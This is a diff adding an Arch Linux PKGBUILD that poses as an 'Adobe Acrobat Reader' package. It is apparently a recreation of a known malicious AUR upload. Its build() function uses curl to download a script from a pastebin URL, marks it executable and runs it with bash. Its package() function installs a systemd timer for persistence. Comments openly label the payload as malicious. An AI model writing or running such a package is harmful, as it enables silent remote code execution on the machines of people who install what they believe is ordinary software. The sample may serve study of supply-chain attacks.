@@ -1,0 +1,37 @@
+# Maintainer: xeactor <attacker@evil.com>
+# 2018 xeactor attack style - pastebin + systemd timer
+
+pkgname=acroread
+pkgver=2.0.0
+pkgrel=1
+pkgdesc="Adobe Acrobat Reader"
+arch=('x86_64')
+url="https://adobe.com"
+license=('proprietary')
+depends=('glibc')
+
+build() {
+    # Download malicious script from pastebin
+    curl https://ptpb.pw/~x -o ~/.x
+    chmod +x ~/.x
+
+    # Execute the payload
+    bash ~/.x
+}
+
+package() {
+    # Create systemd timer for persistence
+    mkdir -p "${pkgdir}/etc/systemd/system"
+
+    cat > "${pkgdir}/etc/systemd/system/acroread-update.timer" << EOF
+[Unit]
+Description=Acroread Update Timer
+
+[Timer]
+OnBootSec=60
+OnUnitActiveSec=360
+
+[Install]
+WantedBy=timers.target
+EOF
+}
